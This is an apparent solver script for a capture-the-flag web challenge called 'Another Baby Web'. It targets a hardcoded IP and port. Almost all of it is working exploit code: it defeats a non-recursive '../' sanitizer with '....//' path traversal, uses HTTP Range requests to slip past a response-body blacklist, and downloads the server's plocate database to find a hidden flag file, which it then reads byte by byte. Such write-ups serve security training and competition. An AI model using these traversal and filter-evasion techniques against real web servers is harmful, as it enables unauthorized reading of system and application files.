#!/usr/bin/env python3
"""Solver for ASIS CTF 2026 - Another Baby Web!

Exploit chain:
1. Bypass the non-recursive "../" sanitizer with "....//".
2. Abuse HTTP Range so the response-body blacklist never sees "ASIS" or "lib".
3. Download /var/lib/plocate/plocate.db and query it locally.
4. Extract the hidden /app/<random>/flag.txt path.
5. Read the real flag one byte at a time.
"""
from __future__ import annotations

import argparse
import base64
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

import requests

DEFAULT_URL = "http://91.107.191.73:29994"
PLOCATE_PATH = "/var/lib/plocate/plocate.db"
HIDDEN_FLAG_RE = re.compile(r"^/app/[0-9a-f]{32}/flag\.txt$")


class Oracle:
    def __init__(self, base_url: str, timeout: float = 8.0) -> None:
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()

    @staticmethod
    def traverse(abs_path: str) -> str:
        """Map an absolute root path through the broken sanitizer."""
        if not abs_path.startswith("/"):
            raise ValueError("absolute path required")
        return "/....//....//" + abs_path.lstrip("/")

    def read_range(self, user_path: str, start: int, end: int) -> bytes | None:
        """Read inclusive [start,end]. None means blocked/missing/unsat."""
        try:
            r = self.session.get(
                self.base + "/inspect",
                params={"path": user_path},
                headers={"Range": f"bytes={start}-{end}"},
                timeout=self.timeout,
            )
        except requests.RequestException:
            return None
        if r.status_code not in (200, 206):
            return None
        try:
            return base64.b64decode(r.json()["content"])
        except Exception:
            return None

    def byte_exists(self, user_path: str, offset: int) -> bool:
        data = self.read_range(user_path, offset, offset)
        return data is not None and len(data) == 1

    def size(self, user_path: str, max_size: int = 128 * 1024 * 1024) -> int:
        """Find file size with one-byte Range probes."""
        if not self.byte_exists(user_path, 0):
            raise RuntimeError(f"cannot read {user_path}")
        lo, hi = 0, 1
        while hi < max_size and self.byte_exists(user_path, hi):
            lo, hi = hi, hi * 2
        if hi >= max_size:
            raise RuntimeError("file too large or size bound too small")
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if self.byte_exists(user_path, mid):
                lo = mid
            else:
                hi = mid
        return hi

    def read_adaptive(self, user_path: str, start: int, end: int) -> bytes:
        """Read [start,end) and split only chunks rejected by bad_data()."""
        for _ in range(4):
            data = self.read_range(user_path, start, end - 1)
            if data is not None and len(data) == end - start:
                return data
            if end - start == 1:
                time.sleep(0.1)
                continue
            break
        if end - start == 1:
            raise RuntimeError(f"failed to fetch byte {start}")
        mid = (start + end) // 2
        return (
            self.read_adaptive(user_path, start, mid)
            + self.read_adaptive(user_path, mid, end)
        )

    def download(self, user_path: str, out: Path, chunk: int = 16384) -> None:
        total = self.size(user_path)
        buf = bytearray()
        for start in range(0, total, chunk):
            end = min(total, start + chunk)
            buf += self.read_adaptive(user_path, start, end)
            print(f"[+] plocate.db {end}/{total}", file=sys.stderr)
        out.write_bytes(buf)


def find_hidden_flag_path(db_path: Path) -> str:
    plocate = shutil.which("plocate")
    if not plocate:
        raise RuntimeError("local 'plocate' command is required")
    proc = subprocess.run(
        [plocate, "-d", str(db_path), "/"],
        check=True,
        capture_output=True,
        text=True,
    )
    for line in proc.stdout.splitlines():
        if HIDDEN_FLAG_RE.match(line):
            return line
    raise RuntimeError("hidden flag path not found in plocate database")


def read_flag(oracle: Oracle, abs_path: str, max_len: int = 256) -> str:
    # /app is already the challenge root, so strip it before using /inspect.
    if not abs_path.startswith("/app/"):
        raise RuntimeError(f"unexpected flag path: {abs_path}")
    user_path = abs_path[len("/app") :]
    out = bytearray()
    for i in range(max_len):
        data = oracle.read_range(user_path, i, i)
        if data is None or len(data) != 1:
            break
        out += data
        if data == b"}":
            break
    return out.decode("utf-8", "replace")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("url", nargs="?", default=DEFAULT_URL)
    args = ap.parse_args()

    oracle = Oracle(args.url)
    cache = Path(__file__).with_name(".remote_plocate.db")
    try:
        oracle.download(Oracle.traverse(PLOCATE_PATH), cache)
        hidden = find_hidden_flag_path(cache)
        print(f"[+] hidden path: {hidden}")
        flag = read_flag(oracle, hidden)
        print(flag)
        return 0 if flag.startswith("ASIS{") and flag.endswith("}") else 1
    finally:
        try:
            cache.unlink()
        except FileNotFoundError:
            pass


if __name__ == "__main__":
    raise SystemExit(main())
